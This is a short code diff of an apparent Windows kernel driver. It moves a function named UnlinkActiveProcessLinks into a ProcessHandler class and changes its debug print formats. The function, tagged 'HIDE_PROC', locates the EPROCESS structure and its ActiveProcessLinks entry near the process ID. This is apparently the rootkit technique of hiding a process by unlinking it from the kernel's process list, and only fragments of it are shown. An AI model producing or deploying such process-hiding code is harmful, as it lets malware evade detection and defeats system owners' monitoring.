@@ -1,7 +1,6 @@
-#include <ntifs.h>
-#include <ntddk.h>
+#include "ProcessHandler.h"
 
-NTSTATUS UnlinkActiveProcessLinks(ULONG pid) {
+NTSTATUS ProcessHandler::UnlinkActiveProcessLinks(ULONG pid) {
 	NTSTATUS status;
 	PEPROCESS EProc;
 	PLIST_ENTRY PrevListEntry, NextListEntry, CurrListEntry;
@@ -15,7 +14,7 @@ NTSTATUS UnlinkActiveProcessLinks(ULONG pid) {
 		return status;
 	}
 
-	KdPrint(("HIDE_PROC: EPROCESS struct addr: 0x%08X\n", EProc));
+	KdPrint(("HIDE_PROC: EPROCESS struct addr: %p\n", EProc));
 
 	PULONG procPtr = reinterpret_cast<PULONG>(EProc);
 
@@ -28,7 +27,7 @@ NTSTATUS UnlinkActiveProcessLinks(ULONG pid) {
 		{
 			//Calculate ActiveProcessLinks (located near PID).
 			CurrListEntry = reinterpret_cast<PLIST_ENTRY>(&procPtr[i + 1]);
-			KdPrint(("HIDE_PROC: LIST_ENTRY struct at: 0x%08X\n", CurrListEntry));
+			KdPrint(("HIDE_PROC: LIST_ENTRY struct at: %p\n", CurrListEntry));
 			break;
 		}
 	}
